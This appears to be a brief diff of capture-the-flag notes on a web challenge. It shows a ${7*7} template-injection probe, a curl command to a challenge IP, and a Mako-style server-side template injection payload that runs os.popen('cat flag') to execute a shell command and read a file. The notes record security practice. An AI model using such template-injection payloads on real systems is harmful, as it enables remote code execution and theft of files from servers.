@@ -1,0 +1,9 @@
+${7*7}
+with this payload we are able to receive an answer back
+we can use curl -I http://34.159.99.169:31052/
+burpsuite
+name=<%
+import os
+x=os.popen('cat flag').read()
+%>
+${x}
